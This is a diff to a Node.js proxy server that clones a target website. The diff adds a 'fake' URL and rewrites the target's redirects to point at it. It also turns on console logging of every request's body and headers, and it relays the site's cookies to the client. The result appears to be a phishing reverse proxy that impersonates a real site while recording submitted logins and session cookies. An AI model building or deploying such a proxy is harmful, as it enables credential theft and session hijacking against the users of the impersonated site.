@@ -2,7 +2,8 @@ const fetch = require("node-fetch");
 const fs = require("fs");
 const http = require("http");
 const port = 20020;
-const url_dest = ""; // URL de destino a clonar
+const url_dest = ""; // URL a clonar
+const url_new = ""; // URL Fake
 let server = http.createServer();
 server.on("request", read);
 server.listen(port, function () {
@@ -29,7 +30,7 @@ function read(req, res) {
 }
 async function run(res, body, query, path, method, headers) {
   headers.host = url_dest;
-  //console.log(body, query, path, method, headers);
+  console.log(body, query, path, method, headers);
   console.log(url_dest + path);
   let _res = "";
   if (body != "") {
@@ -49,11 +50,17 @@ async function run(res, body, query, path, method, headers) {
     });
   }
   let content = _res.headers.get("content-type");
+  let location = _res.headers.get("location");
   let cookie = _res.headers.raw()["set-cookie"];
   if (cookie != undefined) {
     for (let w in cookie) {
       res.setHeader("set-cookie", cookie[w]);
     }
+  }
+  if (location != null) {
+    console.log("location", location);
+    res.setHeader("Location", location.replace(url_dest, url_new));
+    res.statusCode = 302;
   }
   _res = await _res.arrayBuffer();
   res.setHeader("Content-Type", content);
